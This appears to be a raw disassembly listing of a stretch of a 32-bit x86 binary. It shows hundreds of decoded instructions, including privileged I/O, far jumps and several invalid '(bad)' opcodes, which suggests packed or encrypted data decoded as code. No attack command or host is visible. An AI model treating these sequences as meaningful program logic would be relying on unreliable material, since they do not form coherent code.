  4b4937:	and    eax,0x5917eb06
  4b493c:	and    BYTE PTR [edi+0x1ac00460],ah
  4b4942:	cmp    BYTE PTR [edi+esi*1],bh
  4b4945:	inc    esi
  4b4946:	cmp    DWORD PTR [edx+0x53],ecx
  4b4949:	cmp    DWORD PTR [eax],ebp
  4b494b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b494c:	rol    edi,1
  4b494e:	push   0x89c1416a
  4b4953:	sbb    bh,BYTE PTR [edi-0x16]
  4b4956:	cmp    eax,0x63a123e
  4b495b:	jmp    0x8646:0xc069851
  4b4962:	add    DWORD PTR [edx+0x3],edi
  4b4965:	hlt    
  4b4966:	sub    al,0x92
  4b4968:	push   ds
  4b4969:	jae    0x4b4944
  4b496b:	sbb    esi,DWORD PTR [esi+eiz*1-0x53]
  4b496f:	lock xchg edx,eax
  4b4971:	popa   
  4b4972:	loopne 0x4b49b9
  4b4974:	leave  
  4b4975:	popf   
  4b4976:	mov    eax,0x5cb0f6d
  4b497b:	(bad)  
  4b497c:	js     0x4b4969
  4b497e:	mov    eax,0x112ae76c
  4b4983:	rol    esp,0xc3
  4b4986:	arpl   WORD PTR [edi],sp
  4b4988:	mov    esi,0x9c6f6647
  4b498d:	ja     0x4b49e0
  4b498f:	retf   
  4b4990:	mov    bh,0x88
  4b4992:	jno    0x4b49e1
  4b4994:	or     DWORD PTR [ebp+0x1e09a9a6],edx
  4b499a:	jmp    0x4b49f6
  4b499c:	add    al,0x10
  4b499e:	pop    ebp
  4b499f:	cld    
  4b49a0:	jecxz  0x4b4998
  4b49a2:	in     eax,dx
  4b49a3:	cmp    eax,0xb6a586ac
  4b49a8:	sbb    dl,BYTE PTR [ecx-0x67ebfb7a]
  4b49ae:	jne    0x4b4a18
  4b49b0:	xor    DWORD PTR [esi+esi*2-0x2b],0x60
  4b49b5:	mov    bl,0x3a
  4b49b7:	fcomp  QWORD PTR [edx-0x4]
  4b49ba:	jae    0x4b4a02
  4b49bc:	jg     0x4b4a11
  4b49be:	sbb    eax,DWORD PTR [ebx-0x7f9676db]
  4b49c4:	out    dx,al
  4b49c5:	lods   eax,DWORD PTR ds:[esi]
  4b49c6:	int    0xf8
  4b49c8:	pop    edx
  4b49c9:	push   edx
  4b49ca:	pop    ds
  4b49cb:	es push 0x7c
  4b49ce:	imul   ebp,edi,0xe09b19a
  4b49d4:	push   ebx
  4b49d5:	xchg   ebp,eax
  4b49d6:	inc    esi
  4b49d7:	mov    dh,BYTE PTR [edx+0x1b]
  4b49da:	loopne 0x4b49f5
  4b49dc:	stos   DWORD PTR es:[edi],eax
  4b49dd:	mov    edx,0x9757a034
  4b49e2:	or     eax,0xca092e27
  4b49e7:	jge    0x4b49c0
  4b49e9:	or     dh,BYTE PTR [ebx]
  4b49eb:	mov    ebx,0x33625860
  4b49f0:	lds    esp,FWORD PTR ds:0xac24a96
  4b49f6:	mov    bh,0xf1
  4b49f8:	outs   dx,BYTE PTR ds:[esi]
  4b49f9:	rol    BYTE PTR [ecx],1
  4b49fb:	popa   
  4b49fc:	je     0x4b4a6b
  4b49fe:	mul    BYTE PTR [ecx-0x374adc1f]
  4b4a04:	jg     0x4b4a12
  4b4a06:	xor    ebx,ebx
  4b4a08:	pop    esp
  4b4a09:	lock mov ebx,0x8b137b01
  4b4a0f:	pop    ss
  4b4a10:	push   esi
  4b4a11:	mov    eax,ds:0x570d2052
  4b4a16:	cwde   
  4b4a17:	ins    BYTE PTR es:[edi],dx
  4b4a18:	sbb    dl,cl
  4b4a1a:	push   esi
  4b4a1b:	xchg   bh,dh
  4b4a1d:	jo     0x4b49f9
  4b4a1f:	inc    ebx
  4b4a20:	das    
  4b4a21:	jne    0x4b4a0b
  4b4a23:	mov    bl,0x8f
  4b4a25:	mov    cl,0x5b
  4b4a27:	ret    0x4253
  4b4a2a:	cmp    DWORD PTR [ebp-0x2d4334a9],ebx
  4b4a30:	shl    DWORD PTR [ebp+0x42],0xc7
  4b4a34:	sub    dh,0x32
  4b4a37:	xor    edx,DWORD PTR [ebx]
  4b4a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b4a3a:	xchg   edi,eax
  4b4a3b:	ins    BYTE PTR es:[edi],dx
  4b4a3c:	jnp    0x4b49e3
  4b4a3e:	lock or esp,0x75573305
  4b4a45:	jae    0x4b4a8e
  4b4a47:	sub    edx,DWORD PTR [ebp-0x1c19cb18]
  4b4a4d:	add    DWORD PTR [ecx],esp
  4b4a4f:	mov    bh,0x1f
  4b4a51:	and    eax,0x90777ede
  4b4a56:	pop    ebp
  4b4a57:	push   ebx
  4b4a58:	sar    DWORD PTR [eax+0x34743ea6],0x6a
  4b4a5f:	or     dl,dl
  4b4a61:	push   ebx
  4b4a62:	sbb    eax,DWORD PTR [edx]
  4b4a64:	xor    DWORD PTR [edx-0x63a7dfee],0xf5fe0d99
  4b4a6e:	ins    DWORD PTR es:[edi],dx
  4b4a6f:	cmc    
  4b4a70:	repnz mov edi,0x3cc24f84
  4b4a76:	(bad)  
  4b4a77:	jge    0x4b4a55
  4b4a79:	adc    eax,0x56b6643
  4b4a7e:	adc    BYTE PTR [eax-0x51],bh
  4b4a81:	lds    eax,FWORD PTR [edi+0x57076b57]
  4b4a87:	inc    esi
  4b4a88:	inc    ebp
  4b4a89:	lea    ebx,[ebp-0x24]
  4b4a8c:	imul   ecx,DWORD PTR [ecx+0x65],0xd35792e0
  4b4a93:	lods   al,BYTE PTR ds:[esi]
  4b4a94:	pop    eax
  4b4a95:	add    BYTE PTR fs:[ecx+0x5858e398],bl
  4b4a9c:	xchg   esp,eax
  4b4a9d:	inc    edi
  4b4a9e:	scas   al,BYTE PTR es:[edi]
  4b4a9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b4aa0:	fcom   st(2)
  4b4aa2:	pop    eax
  4b4aa3:	lock add BYTE PTR [eax+eiz*2],al
  4b4aa7:	jno    0x4b4ade
  4b4aa9:	xchg   esi,eax
  4b4aaa:	or     al,0xc5
  4b4aac:	sbb    al,0x45
  4b4aae:	es cwde 
  4b4ab0:	gs leave 
  4b4ab2:	pop    eax
  4b4ab3:	and    al,0xa9
  4b4ab5:	jp     0x4b4a6c
  4b4ab7:	int    0xc5
  4b4ab9:	adc    al,0xbc
  4b4abb:	pop    eax
  4b4abc:	ret    0x1741
  4b4abf:	dec    esp
  4b4ac0:	xchg   ebx,eax
  4b4ac1:	adc    BYTE PTR [edx-0x7ebe7d10],dl
  4b4ac7:	pop    ebp
  4b4ac8:	clc    
  4b4ac9:	nop
  4b4aca:	cdq    
  4b4acb:	mov    ah,0xfe
  4b4acd:	xchg   ebx,eax
  4b4ace:	push   ebx
  4b4acf:	dec    ecx
  4b4ad0:	fdiv   QWORD PTR [eax+0x44]
  4b4ad3:	mov    ds:0xc426c074,eax
  4b4ad8:	shr    al,1
  4b4ada:	inc    ebp
  4b4adb:	add    eax,edi
  4b4add:	leave  
  4b4ade:	and    BYTE PTR [ecx-0x7e4916bd],bh
  4b4ae4:	inc    esp
  4b4ae5:	jge    0x4b4ac0
  4b4ae7:	sbb    ecx,DWORD PTR [edx]
  4b4ae9:	sbb    ebx,DWORD PTR [ecx+ecx*4+0x3d]
  4b4aed:	ret    0xc5c4
  4b4af0:	mov    ch,0x6f
  4b4af2:	xchg   DWORD PTR [eax],ecx
  4b4af4:	sub    DWORD PTR [ecx+0x33],ecx
  4b4af7:	adc    DWORD PTR [ebx-0x491e0704],ebx
  4b4afd:	jne    0x4b4b04
  4b4aff:	or     al,0x72
  4b4b01:	mov    ds:0x984d6991,eax
  4b4b06:	or     BYTE PTR [ebp+0xe],bl
  4b4b09:	shl    edx,1
  4b4b0b:	shl    BYTE PTR [esi-0x1],1
  4b4b0e:	in     eax,0x3b
  4b4b10:	jge    0x4b4b0a
  4b4b12:	jb     0x4b4af4
  4b4b14:	or     BYTE PTR [eax-0x25],cl
  4b4b17:	push   ebx
  4b4b18:	add    eax,0x2c446225
  4b4b1d:	add    bl,dh
  4b4b1f:	aaa    
  4b4b20:	popa   
  4b4b21:	ins    BYTE PTR es:[edi],dx
  4b4b22:	jns    0x4b4b98
  4b4b24:	push   es
  4b4b25:	ins    DWORD PTR es:[edi],dx
  4b4b26:	fmul   QWORD PTR [ebp-0x66c5ebe8]
  4b4b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b4b2d:	xor    ah,bl
  4b4b2f:	sub    eax,0x1c46db58
  4b4b34:	std    
  4b4b35:	daa    
  4b4b36:	and    eax,0xc780206
  4b4b3b:	dec    DWORD PTR [ecx+ebx*1+0x34107c23]
  4b4b42:	gs adc al,0x53
  4b4b45:	retf   0x6265
  4b4b48:	(bad)  
  4b4b49:	clc    
  4b4b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b4b4b:	add    BYTE PTR [edx],bh
  4b4b4d:	cmp    BYTE PTR [edx+0x3dcf9c36],bl
  4b4b53:	sbb    edx,eax
  4b4b55:	scas   eax,DWORD PTR es:[edi]
  4b4b56:	jmp    0x26d7:0x3b391a06
  4b4b5d:	cld    
  4b4b5e:	add    bh,bh
  4b4b60:	xor    DWORD PTR [edi+ecx*4],ecx
  4b4b63:	push   es
  4b4b64:	sbb    BYTE PTR [ecx+ecx*4+0x30cec73a],al
  4b4b6b:	loopne 0x4b4b95
  4b4b6d:	xlat   BYTE PTR ds:[ebx]
  4b4b6e:	into   
  4b4b6f:	jo     0x4b4b68
  4b4b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b4b72:	rcl    BYTE PTR [edx],cl
  4b4b74:	jl     0x4b4be1
  4b4b76:	inc    ebp
  4b4b77:	sbb    BYTE PTR [eax+0x6c],0xd
  4b4b7b:	test   BYTE PTR [eax+0x5ff7496d],bl
  4b4b81:	and    BYTE PTR [edx-0x80],dh
  4b4b84:	test   DWORD PTR [ebx],eax
  4b4b86:	fdiv   DWORD PTR [edi+ebp*2+0x11]
  4b4b8a:	or     bl,BYTE PTR ds:0x8079f100
  4b4b90:	cmp    BYTE PTR [esi],al
  4b4b92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b4b93:	aas    
  4b4b94:	xchg   ecx,eax
  4b4b95:	loope  0x4b4c00
  4b4b97:	aad    0x85
  4b4b99:	rol    DWORD PTR [eax+0x601307c],0xf5
  4b4ba0:	or     al,0xb5
  4b4ba2:	sub    ch,BYTE PTR [eax]
  4b4ba4:	nop
  4b4ba5:	call   DWORD PTR [edx-0x1a]
  4b4ba8:	mov    bl,BYTE PTR [ebp+0x3c]
  4b4bab:	inc    esp
  4b4bac:	push   es
  4b4bad:	js     0x4b4b63
  4b4baf:	int3   
  4b4bb0:	dec    eax
  4b4bb1:	cmp    al,0xee
  4b4bb3:	call   0x8107:0xa40e3f42
  4b4bba:	retf   
  4b4bbb:	mov    edx,edx
  4b4bbd:	xor    al,0xed
  4b4bbf:	loopne 0x4b4b4d
  4b4bc1:	pop    esp
  4b4bc2:	dec    ebp
  4b4bc3:	push   eax
  4b4bc4:	add    al,0xe
  4b4bc6:	mov    esp,0x53388ccc
  4b4bcb:	push   es
  4b4bcc:	push   cs
  4b4bcd:	push   ecx
  4b4bce:	push   ebp
  4b4bcf:	xor    ah,BYTE PTR ds:0x160dd34d
  4b4bd5:	les    ecx,FWORD PTR [edi]
  4b4bd7:	mov    ebx,DWORD PTR [ebp+0x5e]
  4b4bda:	in     al,0x4
  4b4bdc:	hlt    
  4b4bdd:	add    edx,esp
  4b4bdf:	push   ecx
  4b4be0:	adc    BYTE PTR [eax+eax*2-0xb0fec68],cl
  4b4be7:	sub    bl,ch
  4b4be9:	dec    edi
  4b4bea:	add    ecx,DWORD PTR [esi-0x71]
  4b4bed:	(bad)  
  4b4bee:	call   DWORD PTR [ecx+0x3]
  4b4bf1:	or     al,0x64
  4b4bf3:	sbb    BYTE PTR [ebp-0x28],0x5b
  4b4bf7:	and    BYTE PTR [edi+edx*1],dh
  4b4bfa:	mov    ebx,0xdc05081c
  4b4bff:	pop    ebx
  4b4c00:	adc    BYTE PTR [edi],al
  4b4c02:	mov    ebx,0x30f27834
  4b4c07:	jmp    0x4b4c88
  4b4c09:	or     eax,0x655e404
  4b4c0e:	cmp    DWORD PTR [ebx+edx*2],0x6
  4b4c12:	inc    eax
  4b4c13:	push   esp
  4b4c14:	pop    es
  4b4c15:	nop
  4b4c16:	addr16 push 0xffffff97
  4b4c19:	or     ah,ch
  4b4c1b:	push   ebp
  4b4c1c:	or     dl,BYTE PTR [eax+0x5c]
  4b4c1f:	in     al,dx
  4b4c20:	shl    BYTE PTR [eax+0x29],cl
  4b4c23:	add    DWORD PTR [eax+edi*8],ecx
  4b4c26:	stos   DWORD PTR es:[edi],eax
  4b4c27:	push   edi
  4b4c28:	icebp  
  4b4c29:	repz retf 
  4b4c2b:	ror    DWORD PTR [esi],cl
  4b4c2d:	cmp    BYTE PTR [edi-0x2],0xb
  4b4c31:	fadd   DWORD PTR [eax-0x4959f1c4]
  4b4c37:	pop    esp
  4b4c38:	pop    edx
  4b4c39:	dec    eax
  4b4c3a:	test   BYTE PTR [ebx+0x14],ah
  4b4c3d:	fist   WORD PTR [edi+0x57]
  4b4c40:	and    BYTE PTR [eax+0x70148715],dh
  4b4c46:	pop    es
  4b4c47:	icebp  
  4b4c48:	or     al,0x3
  4b4c4a:	fnsave [ebp+0x4b]
  4b4c4d:	popf   
  4b4c4e:	call   DWORD PTR [ebx]
  4b4c50:	shl    DWORD PTR [ebx],1
  4b4c52:	or     DWORD PTR [edi],edx
  4b4c54:	mov    ah,0xce
  4b4c56:	add    DWORD PTR [ecx+ebp*2],ebp
  4b4c59:	adc    ah,ah
  4b4c5b:	arpl   WORD PTR [esp+esi*1+0x3e],di
  4b4c5f:	sub    al,0x8f
  4b4c61:	or     al,0x0
  4b4c63:	sub    eax,0xcd087b13
  4b4c68:	jecxz  0x4b4c15
  4b4c6a:	pop    ds
  4b4c6b:	idiv   BYTE PTR [ecx]
  4b4c6d:	sahf   
  4b4c6e:	push   ss
  4b4c6f:	mov    eax,cs
  4b4c71:	lods   al,BYTE PTR ds:[esi]
  4b4c72:	fdivr  DWORD PTR [ebp+0x19047a8]
  4b4c78:	push   ebx
  4b4c79:	nop
  4b4c7a:	inc    ebx
  4b4c7b:	sub    BYTE PTR [ebx],al
  4b4c7d:	stc    
  4b4c7e:	xchg   esi,eax
  4b4c7f:	cmp    al,0x1
  4b4c81:	sbb    al,BYTE PTR [ebp+0x38]
  4b4c84:	out    dx,eax
  4b4c85:	rol    al,1
  4b4c87:	(bad)  
  4b4c88:	jo     0x4b4c8a
  4b4c8a:	and    edi,DWORD PTR ds:0x74417f7f
  4b4c90:	cmp    BYTE PTR [edx+0x40],dl
  4b4c93:	pop    eax
  4b4c94:	dec    edi
  4b4c95:	xor    al,0xe
  4b4c97:	push   esp
  4b4c98:	adc    BYTE PTR ds:0x52c17a3c,cl
  4b4c9e:	jne    0x4b4c6d
  4b4ca0:	mov    eax,0x5d0950a
  4b4ca5:	dec    ebx
  4b4ca6:	inc    eax
  4b4ca7:	aas    
  4b4ca8:	in     eax,dx
  4b4ca9:	cmp    bl,bh
  4b4cab:	lock add eax,0x8812b668
  4b4cb1:	jp     0x4b4c3b
  4b4cb3:	inc    ebp
  4b4cb4:	fldpi  
  4b4cb6:	xor    al,0x79
  4b4cb8:	xchg   edi,eax
  4b4cb9:	fbstp  TBYTE PTR [eax]
  4b4cbb:	jg     0x4b4c9c
  4b4cbd:	fdiv   DWORD PTR [eax+eax*2-0x53]
  4b4cc1:	mov    ds:0x500ca79a,al
  4b4cc6:	xchg   edx,eax
  4b4cc7:	and    ch,bl
  4b4cc9:	adc    ebp,DWORD PTR [eax]
  4b4ccb:	dec    ecx
  4b4ccc:	test   eax,0x18c89565
  4b4cd1:	add    eax,edi
  4b4cd3:	jns    0x4b4d1a
  4b4cd5:	not    dh
  4b4cd7:	jle    0x4b4ca4
  4b4cd9:	adc    cl,BYTE PTR [eax+edx*2-0x4b4daf36]
  4b4ce0:	add    al,0x9b
  4b4ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b4ce3:	imul   ebx,DWORD PTR [edx-0x5b534f48],0xf489a0a8
  4b4ced:	add    eax,DWORD PTR [eax]
  4b4cef:	ficom  DWORD PTR [ebp-0x78]
  4b4cf2:	jbe    0x4b4c80
  4b4cf4:	xor    al,BYTE PTR [ebp-0x70]
  4b4cf7:	or     ch,bh
  4b4cf9:	jbe    0x4b4d0f
  4b4cfb:	push   ecx
  4b4cfc:	mov    ecx,eax
  4b4cfe:	add    cx,ax
  4b4d01:	add    edx,DWORD PTR [edx-0x80]
  4b4d04:	add    edx,ecx
  4b4d06:	stos   BYTE PTR es:[edi],al
  4b4d07:	xchg   esp,eax
  4b4d08:	inc    edx
  4b4d09:	cld    
  4b4d0a:	js     0x4b4d74
  4b4d0c:	and    eax,0x8d57acb4
  4b4d11:	push   eax
  4b4d12:	in     al,dx
  4b4d13:	inc    esi
  4b4d14:	rcl    BYTE PTR [ecx+0x57a24bb2],0x0
  4b4d1b:	ds (bad) 
  4b4d1d:	es dec esi
  4b4d1f:	xor    BYTE PTR [edi],dh
  4b4d21:	inc    edx
  4b4d22:	fadd   DWORD PTR [edi]
  4b4d24:	push   ecx
  4b4d25:	push   ebx
  4b4d26:	dec    ecx
  4b4d27:	add    BYTE PTR [esi+0x2c6e0c24],0x3
  4b4d2e:	in     eax,dx
  4b4d2f:	dec    esp
  4b4d30:	rol    BYTE PTR [eax+ebx*4],0x83
  4b4d34:	clc    
  4b4d35:	mov    BYTE PTR [ebp-0x1566e053],0x71
  4b4d3c:	pop    esi
  4b4d3d:	pop    ebp
  4b4d3e:	les    edi,FWORD PTR [eax]
  4b4d40:	cmp    ecx,esp
  4b4d42:	pop    eax
  4b4d43:	les    eax,FWORD PTR [ecx]
  4b4d45:	imul   edx,DWORD PTR es:[edi-0x6ade15a],0x54
  4b4d4d:	add    DWORD PTR [eax],eax
  4b4d4f:	jle    0x4b4d65
  4b4d51:	push   ebp
  4b4d52:	test   al,0xbf
  4b4d54:	ret    
  4b4d55:	nop
  4b4d56:	push   esp
  4b4d57:	sub    bl,BYTE PTR [edx+0x25c8da4]
  4b4d5d:	sub    BYTE PTR [ebx+0x0],dl
  4b4d60:	dec    esp
  4b4d61:	or     al,0x1b
  4b4d63:	push   ebp
  4b4d64:	lock or dl,dl
  4b4d67:	xor    eax,0x53752394
  4b4d6c:	adc    eax,0x89e0649d
  4b4d71:	test   BYTE PTR [esi],al
  4b4d73:	add    DWORD PTR fs:0xbc90a260,ecx
  4b4d7a:	lahf   
  4b4d7b:	dec    ebp
  4b4d7c:	pusha  
  4b4d7d:	inc    edi
  4b4d7e:	lea    esp,[edx+eiz*2]
  4b4d81:	int    0x56
  4b4d83:	push   cs
  4b4d84:	es loope 0x4b4d75
  4b4d87:	sub    esp,DWORD PTR [esi+0x5628ba14]
  4b4d8d:	sbb    dl,BYTE PTR [edx-0x12c317db]
  4b4d93:	inc    ebp
  4b4d94:	test   al,0x66
  4b4d96:	inc    esi
  4b4d97:	sbb    ah,BYTE PTR [eax+ecx*1-0x3752878]
  4b4d9e:	and    BYTE PTR [esp],al
  4b4da1:	push   ebx
  4b4da2:	lock dec ecx
  4b4da4:	push   es
  4b4da5:	ss xor al,0x18
  4b4da8:	inc    ebp
  4b4da9:	and    eax,0xd5a6fdf8
  4b4dae:	and    esi,eax
  4b4db0:	xor    BYTE PTR [edi+0x1c5e584e],dh
  4b4db6:	push   edi
  4b4db7:	repz gs push 0x1d91028
  4b4dbe:	pushf  
  4b4dbf:	dec    ebp
  4b4dc0:	loopne 0x4b4e13
  4b4dc2:	mov    al,ds:0x343c09b
  4b4dc7:	mov    esi,0x4b8c5af0
  4b4dcc:	add    esp,DWORD PTR [edi-0x37821427]
  4b4dd2:	int3   
  4b4dd3:	jbe    0x4b4d67
  4b4dd5:	push   ecx
  4b4dd6:	(bad)  
  4b4dd7:	add    BYTE PTR [eax],bl
  4b4dd9:	mov    BYTE PTR [esi-0x7533ed69],al
  4b4ddf:	in     eax,0xec
  4b4de1:	test   al,0x78
  4b4de3:	lock inc eax
  4b4de5:	xchg   DWORD PTR [edx+0x3b],edx
  4b4de8:	push   eax
  4b4de9:	out    0xe,eax
  4b4deb:	push   dx
  4b4ded:	lock cmp DWORD PTR [eax],ebp
  4b4df0:	int3   
  4b4df1:	lods   al,BYTE PTR ds:[esi]
  4b4df2:	xor    BYTE PTR [eax],dl
  4b4df4:	mov    ah,0x66
  4b4df6:	js     0x4b4e0a
  4b4df8:	lods   eax,DWORD PTR ds:[esi]
  4b4df9:	or     edx,0x397f9494
  4b4dff:	mov    ?,WORD PTR [eax+edi*1-0x1c]
  4b4e03:	mov    dh,0xa0
  4b4e05:	pop    es
  4b4e06:	xchg   ecx,eax
  4b4e07:	push   esi
  4b4e08:	or     DWORD PTR [ebp-0x3d],esp
  4b4e0b:	sbb    BYTE PTR [ecx-0x6cbc3ab8],0xd8
  4b4e12:	daa    
  4b4e13:	cld    
  4b4e14:	push   ss
  4b4e15:	in     eax,dx
  4b4e16:	(bad)  
  4b4e17:	hlt    
  4b4e18:	scas   al,BYTE PTR es:[edi]
  4b4e19:	(bad)
  4b4e1c:	sub    eax,ebx
  4b4e1e:	cmp    edi,DWORD PTR [esi+0x7e]
  4b4e21:	or     DWORD PTR [eax],ebp
  4b4e23:	pop    ss
  4b4e24:	in     eax,0x7d
  4b4e26:	push   ebp
  4b4e27:	inc    ecx
  4b4e28:	jo     0x4b4e4e
  4b4e2a:	mov    WORD PTR [eax-0x30],?
  4b4e2d:	cmp    al,0x25
  4b4e2f:	add    BYTE PTR ds:0x58cadfeb,dl
  4b4e35:	enter  0x21ea,0x64
  4b4e39:	pop    ecx
  4b4e3a:	mov    DWORD PTR [esi],ebx
  4b4e3c:	ror    DWORD PTR [ecx],1
  4b4e3e:	cmp    DWORD PTR [ecx+0xe1560e6],ecx
  4b4e44:	adc    al,0xe0
  4b4e46:	xchg   esi,eax
  4b4e47:	mov    ch,0xad
  4b4e49:	popa   
  4b4e4a:	test   al,0x12
  4b4e4c:	inc    esp
  4b4e4d:	sbb    BYTE PTR [ebx],cl
  4b4e4f:	dec    esp
  4b4e50:	sub    DWORD PTR [esi],esi
  4b4e52:	adc    eax,0x52
  4b4e55:	push   0xa4753a83
  4b4e5a:	inc    esi
  4b4e5b:	and    al,0xa8
  4b4e5d:	jmp    0xf43d:0x212305d3
  4b4e64:	into   
  4b4e65:	dec    esp
  4b4e66:	loop   0x4b4e56
  4b4e68:	and    ch,ah
  4b4e6a:	inc    esp
  4b4e6b:	sbb    DWORD PTR [ecx],eax
  4b4e6d:	mov    dh,0x81
  4b4e6f:	mov    al,ds:0x1a881af2
  4b4e74:	(bad)  
  4b4e75:	xor    eax,0x84627a11
  4b4e7a:	jbe    0x4b4e96
  4b4e7c:	jl     0x4b4ee4
  4b4e7e:	cmp    eax,DWORD PTR [esi+0x10]
  4b4e81:	jbe    0x4b4eaa
  4b4e83:	cmovo  ecx,esp
  4b4e86:	ins    DWORD PTR es:[edi],dx
  4b4e87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b4e88:	sti    
  4b4e89:	adc    BYTE PTR [edi-0x4a],dh
  4b4e8c:	aam    0x9f
  4b4e8e:	pop    eax
  4b4e8f:	cmp    BYTE PTR ds:0x7174ef4c,dh
  4b4e95:	ins    DWORD PTR es:[edi],dx
  4b4e96:	and    BYTE PTR [esi],al
  4b4e98:	push   es
  4b4e99:	imul   esi,DWORD PTR [ebp+0x62],0xe4dbfe4f
  4b4ea0:	sub    bl,ch
  4b4ea2:	and    al,0xff
  4b4ea4:	xor    esp,esi
  4b4ea6:	cmp    ebp,edi
  4b4ea8:	sbb    ah,bh
  4b4eaa:	xchg   esp,eax
  4b4eab:	or     DWORD PTR [ebx],esp
  4b4ead:	inc    edi
  4b4eae:	mov    ebx,0x71b646f4
  4b4eb3:	sbb    BYTE PTR [esi+0xe80416c],dh
  4b4eb9:	add    BYTE PTR [eax+edx*1],0x1f
  4b4ebd:	mov    ch,BYTE PTR [eax-0x6e5b8d63]
  4b4ec3:	pop    esi
  4b4ec4:	mov    BYTE PTR [edx],cl
  4b4ec6:	cli    
  4b4ec7:	xor    BYTE PTR [ebp-0x7a],0xa8
  4b4ecb:	jno    0x4b4ead
  4b4ecd:	push   esp
  4b4ece:	pop    ecx
  4b4ecf:	retf   0xb081
  4b4ed2:	call   0x6078d0b8
  4b4ed7:	xor    ah,cl
  4b4ed9:	jne    0x4b4e6a
  4b4edb:	xor    eax,DWORD PTR [eax+0x18]
  4b4ede:	pusha  
  4b4edf:	leave  
  4b4ee0:	jno    0x4b4e90
  4b4ee2:	setns  BYTE PTR [eax]
  4b4ee5:	add    DWORD PTR [ebp+0x6e169a],edx
  4b4eeb:	stos   DWORD PTR es:[edi],eax
  4b4eec:	or     al,bh
  4b4eee:	in     al,0x3a
  4b4ef0:	push   es
  4b4ef1:	mov    ah,0x2
  4b4ef3:	cli    
  4b4ef4:	pop    edx
  4b4ef5:	in     al,dx
  4b4ef6:	cld    
  4b4ef7:	xchg   DWORD PTR [edx+eax*1],ecx
  4b4efa:	inc    ecx
  4b4efb:	mov    eax,ds:0xd69fd6b
  4b4f00:	mov    al,BYTE PTR [ecx]
  4b4f02:	inc    esp
  4b4f03:	mov    edi,0xd0708410
  4b4f08:	call   0x832:0xb8647c88
  4b4f0f:	jmp    0xf1ead494
  4b4f14:	push   ebx
  4b4f15:	sbb    eax,0xdd644a2
  4b4f1a:	fs dec esi
  4b4f1c:	or     BYTE PTR [eax],dl
  4b4f1e:	out    dx,al
  4b4f1f:	imul   eax,DWORD PTR [ebx],0xfffffff7
  4b4f22:	adc    BYTE PTR [esi+0x79],dl
  4b4f25:	adc    edi,DWORD PTR [esi]
  4b4f27:	inc    esp
  4b4f28:	add    al,0x53
  4b4f2a:	or     BYTE PTR [ebx],cl
  4b4f2c:	mov    eax,ds:0x4bfa562a
  4b4f31:	(bad)  
  4b4f32:	adc    al,0xcd
  4b4f34:	add    eax,0x901a8b10
  4b4f39:	push   ss
  4b4f3a:	push   es
  4b4f3b:	inc    DWORD PTR [esi]
  4b4f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b4f3e:	mov    ebp,DWORD PTR [ebp-0x3f]
  4b4f41:	cmp    al,0x7a
  4b4f43:	shl    DWORD PTR [esi+0x7e],0xc
  4b4f47:	add    bh,ah
  4b4f49:	adc    al,0xb
  4b4f4b:	sbb    BYTE PTR [eax],bh
  4b4f4d:	xor    al,0x84
  4b4f4f:	mov    eax,0x4d37026
  4b4f54:	or     esp,DWORD PTR [ecx-0x3c6dc4fb]
  4b4f5a:	jle    0x4b4f31
  4b4f5c:	and    ah,ah
  4b4f5e:	nop
  4b4f5f:	cmp    dh,dh
  4b4f61:	inc    esi
  4b4f62:	rol    BYTE PTR [edx],1
  4b4f64:	xor    DWORD PTR [eax+0x2b61fd89],edx
  4b4f6a:	stos   DWORD PTR es:[edi],eax
  4b4f6b:	adc    edi,DWORD PTR [edx]
  4b4f6d:	add    ecx,DWORD PTR [esp+eiz*4-0x58]
  4b4f71:	adc    BYTE PTR [ecx+0x11b1b204],dh
  4b4f77:	js     0x4b4f8f
  4b4f79:	fstp   DWORD PTR [ecx+0x471ee305]
  4b4f7f:	push   es
  4b4f80:	adc    dh,BYTE PTR [ebx]
  4b4f82:	popa   
  4b4f83:	lea    eax,[ecx+0x44]
  4b4f86:	add    DWORD PTR [edi-0x3c],eax
  4b4f89:	ret    
  4b4f8a:	pop    esi
  4b4f8b:	adc    eax,0x39026a23
  4b4f90:	add    eax,0xac098d53
  4b4f95:	add    DWORD PTR [eax],edi
  4b4f97:	cdq    
  4b4f98:	mov    ds:0x8756f25a,eax
  4b4f9d:	loope  0x4b5007
  4b4f9f:	add    DWORD PTR [ecx-0x13efa170],esp
  4b4fa5:	je     0x4b4fc8
  4b4fa7:	mov    al,ds:0x3740583d
  4b4fac:	in     al,0xcb
  4b4fae:	mov    ebp,DWORD PTR [edx+0x21]
  4b4fb1:	sbb    BYTE PTR [eax+0x3e],al
  4b4fb4:	out    dx,al
  4b4fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b4fb6:	test   eax,0xdcd740d2
  4b4fbb:	inc    eax
  4b4fbc:	dec    ebp
  4b4fbd:	dec    eax
  4b4fbe:	fidiv  DWORD PTR ds:0x40f9c3a0
  4b4fc4:	add    al,0x89
  4b4fc6:	adc    BYTE PTR [eax+0x2a269dc0],cl
  4b4fcc:	sbb    ebp,DWORD PTR [edi]
  4b4fce:	dec    ebp
  4b4fcf:	clc    
  4b4fd0:	cmp    eax,0x8c604906
  4b4fd5:	xor    ch,BYTE PTR [ebx-0x6a]
  4b4fd8:	jo     0x4b4fea
  4b4fda:	sub    BYTE PTR [ecx+0x4760f45a],cl
  4b4fe0:	dec    eax
  4b4fe1:	(bad)  
  4b4fe3:	(bad)  
  4b4fe4:	(bad)  
  4b4fe5:	mov    al,ds:0xdc148603
  4b4fea:	adc    bl,BYTE PTR [edi+0x5e235bf6]
  4b4ff0:	push   es
  4b4ff1:	push   0x2874183c
  4b4ff6:	jmp    0x4b5032
  4b4ff8:	adc    al,0x4
  4b4ffa:	add    DWORD PTR [ecx+esi*1+0x1],esi
  4b4ffe:	cwde   
  4b4fff:	out    0x1d,al
  4b5001:	jmp    0x4b5032
  4b5003:	add    ecx,eax
  4b5005:	test   eax,0xebe1451f
  4b500a:	and    al,0x7
  4b500c:	jne    0x4b502a
